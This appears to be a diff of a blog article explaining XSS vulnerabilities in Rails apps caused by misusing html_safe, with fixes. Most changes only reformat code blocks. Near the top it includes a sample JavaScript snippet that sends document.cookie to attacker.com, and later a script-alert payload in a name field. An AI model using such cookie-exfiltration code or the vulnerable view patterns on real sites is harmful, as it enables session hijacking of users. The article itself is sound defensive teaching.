@@ -27,8 +27,10 @@ In this article, we&#8217;re going to look at Rails `5.0.0.1/4.2.7.1/3.2.22.3`, 
 
 &#8220;XSS&#8221; stands for cross-site scripting. When your application has an XSS vulnerability, attackers can run malicious Javascript on your users&#8217; browsers. For example, consider a Javascript snippet like the following:
 
-    var i = new Image;
-    i.src = "http://attacker.com/" + document.cookie;
+```javascript
+var i = new Image;
+i.src = "http://attacker.com/" + document.cookie;
+```
     
 
 The above snippet, when run on a user&#8217;s browser, will cause the browser to make a request to `attacker.com` and send over the user&#8217;s cookie. Using this cookie, the attacker can proceed to hijack the user&#8217;s session and gain unauthorized access to secured areas of your app.
@@ -63,12 +65,14 @@ Let&#8217;s consider an example to illustrate how such a vulnerability can arise
 
 Consider a typical Rails app, with users and admins. A user record has three fields &#8211; `name`, `email` and `introduction`. Each user has a profile page where this information is listed. Admins in the system, in addition to being able to access these profile pages, also have access to a `/users` page which consolidates all the users&#8217; information. The view code for this page starts out looking something like this:
 
-    <% #This is accessible only to admins %>
-    <% User.all.each do |user| %>
-      <%= user.name %>
-      <%= user.email %>
-      <%= user.introduction %>
-    <% end %>
+```erb
+<% #This is accessible only to admins %>
+<% User.all.each do |user| %>
+  <%= user.name %>
+  <%= user.email %>
+  <%= user.introduction %>
+<% end %>
+```
     
 
 Now let&#8217;s say we want to give our users the ability to customize their introductions with HTML. So instead of typing in `"I'm awesome!!"` in the introduction field, they can type in `"I'm <strong>awesome!!</strong>"`. To accomplish this in our view, we make use of the `html_safe` helper and change `user.introduction` to `user.introduction.html_safe`. Now, if a user submits text with HTML in it, our view will render the HTML.
@@ -92,12 +96,13 @@ The above example illustrates one straightforward way by which an XSS vulnerabil
 
 Another way using `html_safe` can cause XSS vulnerabilities to sneak up on you is when you find yourself needing to incorporate styling on strings which are derived from user input. Going back to our example Rails app&#8217;s `/users` page, let&#8217;s say we&#8217;ve installed [Font Awesome](http://fontawesome.io/) and we want to provide admins a nicely styled link to a given user&#8217;s profile page. We might do something like this in our view:
 
-    <% User.all.each do |user| %>
-      <%= link_to "<i class='fa fa-user'></i> #{user.name}".html_safe, users_profile_path(user) %>
-      <%= user.email %>
-      <%= user.introduction %>
-    <% end %>
-    
+```erb
+<% User.all.each do |user| %>
+  <%= link_to "<i class='fa fa-user'></i> #{user.name}".html_safe, users_profile_path(user) %>
+  <%= user.email %>
+  <%= user.introduction %>
+<% end %>
+```
 
 As in the previous example, this opens our admin&#8217;s account up to XSS attacks. By submitting javascript in the `name` field, an attacker can proceed to gain access to the admin&#8217;s account.
 
@@ -105,9 +110,9 @@ As in the previous example, this opens our admin&#8217;s account up to XSS attac
 
 The key is to use `html_safe` only on trusted strings, because it is an assertion. You can concatenate a string which is `html_safe` with a string which is not and be assured that the string which is not `html_safe` will be escaped properly. So for example, we can do:
 
-    <%= link_to "<i class='fa fa-user'></i> ".html_safe + "#{user.name}", users_profile_path(user) %>
-    
-
+```erb
+<%= link_to "<i class='fa fa-user'></i> ".html_safe + "#{user.name}", users_profile_path(user) %>
+```
 which will ensure that `user.name` is properly escaped. So if we pass in a string like `"Bob Foo<script>alert(document.cookie)</script>` to name, our HTML will look something like:
 
     <a href='...'><i class='fa fa-user'></i> Bob Foo&lt;script&gt;alert(document.cookie)&lt;/script&gt;</a>
@@ -207,6 +212,3 @@ Have you patched your Rails app recently? If so, how did that process go for you
 **Shout-out: Thanks to [Chris Drane](https://github.com/obromios) for suggesting this article, and to Gabriel Williams at [Cloud City](https://www.cloudcity.io/) for reviewing it!**
 
 **[Click here to download a handy cheatsheet on Rails XSS & Security!](https://ducktypelabs.com/wp-content/uploads/2016/10/Rails_XSS_Security_Cheatsheet.pdf)**
-
-<div id="mc_embed_signup" style="background: #dff7fe; padding: 15px;">
-</div>
